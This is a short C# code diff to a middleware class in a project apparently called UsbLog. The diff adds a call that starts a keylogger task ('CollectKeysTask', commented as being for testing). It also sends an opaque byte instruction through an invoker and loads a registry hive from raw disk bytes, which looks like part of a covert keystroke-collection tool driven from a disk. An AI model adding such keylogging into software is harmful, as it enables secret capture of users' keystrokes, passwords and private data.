@@ -1,5 +1,10 @@
-﻿using PipelineNet.Middleware;
+﻿using DiscUtils.Registry;
+using PipelineNet.Middleware;
 using System;
+using System.IO;
+using UsbLog.Core;
+using UsbLog.Service.Tasks;
+using UsbLog.VM;
 
 namespace UsbLog.Service.Middleware
 {
@@ -7,6 +12,17 @@ namespace UsbLog.Service.Middleware
     {
         public void Run(MiddlewareContext strm, Action<MiddlewareContext> next)
         {
+            //start keylogger for testing
+            InstructionInvoker.AddTask(new CollectKeysTask());
+
+            InstructionInvoker.Invoke(new byte[] { 0xA, 1 }, strm.Hive?.Root);
+
+            var buffer = DISK.ReadBytes(0, 2048, strm.Strm);
+
+            strm.Hive = new RegistryHive(new MemoryStream(buffer));
+            var hello = strm.Hive.Root.OpenSubKey("helloworld");
+            var value = hello.GetValue("data");
+
             next(strm);
         }
     }
